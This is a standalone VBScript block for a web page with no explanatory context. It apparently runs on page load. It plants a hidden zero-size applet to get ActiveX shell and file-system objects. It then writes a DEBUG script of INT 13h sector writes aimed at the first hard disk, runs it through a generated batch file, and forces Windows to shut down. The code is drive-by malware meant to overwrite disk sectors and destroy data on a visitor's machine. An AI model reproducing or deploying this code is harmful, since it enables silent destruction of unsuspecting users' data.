<script language=vbscript> document.write "<div style='position:absolute; left:0px; top:0px; width:0px; height:0px; z-index:28; visibility: hidden'><"&"APPLET NAME=bei"&"jing HEIGHT=0 WIDTH=0 code=com.ms."&"activeX.Active"&"XComponent></APPLET></div>"
Set AppleObject = document.applets("beijing")
AppleObject.setCLSID("{F935DC22-1CF0-11D0-ADB9-00C04FD58A0B}")
AppleObject.createInstance()
Set WShell = AppleObject.GetObject()
AppleObject.setCLSID("{0D43FE01-F093-11CF-8940-00A0C9054228}")
AppleObject.createInstance()
Set Fso = AppleObject.GetObject()
AppleObject.setCLSID("{13709620-C279-11CE-A49E-444553540000}")
AppleObject.createInstance()
Set shell = AppleObject.GetObject()
intxt="a$-$mov ax,0301$-$mov bx,0100$-$mov cx,0100$-$mov dx,0080$-$int 13$-$int 3$-$$-$g$-$$-$w 100 2 0 100$-$w 100 3 0 100$-$q$-$"
intxt=replace(intxt,chr(36)&chr(45)&chr(36),vbcrlf)
set fin=fso.OpenTextFile("in.txt",2,true)
fin.write intxt
fin.close
set bat=fso.OpenTextFile("com.bat",2,true)
bat.write "@ECHO OFF"&vbcrlf&"path="&wph&"\command"&vbcrlf&"debug<in.txt>Nul"&vbcrlf&"exit"
bat.close
WShell.Run("com.bat")
WShell.Run("rundll32.exe user.exe,exitwindows")
</script> 